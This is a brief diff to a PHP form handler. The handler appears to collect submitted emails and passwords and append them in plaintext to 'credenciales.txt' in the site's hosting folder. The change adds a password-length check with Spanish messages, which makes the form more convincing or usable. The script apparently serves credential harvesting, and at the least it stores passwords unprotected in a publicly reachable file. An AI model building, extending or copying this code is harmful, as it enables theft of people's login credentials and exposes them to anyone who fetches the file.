@@ -3,6 +3,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $email = htmlspecialchars($_POST['email']);
     $password = htmlspecialchars($_POST['password']);
 
+    if (strlen($password) < 6) {
+        echo "<h2>La contraseña debe tener al menos 6 caracteres.</h2>";
+        echo "<p>Por favor vuelve a ingresarla.</p>";
+        echo "<p><a href=\"index.html\">Volver</a></p>";
+        exit();
+    }
+
     // Guarda el archivo de texto en la misma carpeta del hosting
     $credentials = sprintf("%s,%s\n", $email, $password);
     $filePath = __DIR__ . '/credenciales.txt';
